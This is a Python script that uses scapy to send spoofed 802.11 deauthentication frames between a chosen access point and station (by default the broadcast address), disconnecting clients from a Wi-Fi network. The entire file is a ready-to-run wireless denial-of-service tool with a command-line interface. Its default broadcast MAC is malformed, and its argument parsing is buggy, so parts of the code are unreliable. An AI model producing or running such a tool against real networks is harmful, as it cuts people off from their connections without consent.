from scapy.all import Dot11 , Dot11Deauth , sendp, RadioTap
import sys
from threading import Thread

def Deauth(ap , station , count = 1, iface = "wlan0", **kwargs):
    for _ in range(count):
        AP_TO_STA = RadioTap() / Dot11(addr1 = station, addr2 = ap, addr3 = ap) / Dot11Deauth(reason = 7)
        STA_TO_AP = RadioTap() / Dot11(addr1 = ap, addr2 = station, addr3 = ap) / Dot11Deauth(reason = 7)   
        sendp(AP_TO_STA, iface = iface, verbose = 0, **kwargs)      
        sendp(STA_TO_AP, iface = iface, verbose = 0, **kwargs)

def Dstart(add = 10, *args, **kwargs):
    threads = []
    for _ in range(add):
        t = Thread(target=Deauth, args=args, kwargs=kwargs)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def run_py():
    argv = sys.argv  
    if len(argv) < 3:
        print("Usage : pyhton ./Deauth.py <ifcae> <ap> [station] [count] [key=value ...]")
        sys.exit()

    iface = argv[1]
    ap = argv[2]
    sta = argv[3] if len(argv) == 4 else "ff:ff:ff:ff:ff:fff"
    count = int(argv[4]) if len(argv) == 5 else 1   

    data = {}  
    if len(argv) > 6:
        for item in argv:
            if "=" in item:
                key, value = item.split("=")  
                data[key] = value
    Deauth(ap, sta, count ,iface, **data)

if __name__ == "__main__":
    run_py()
    
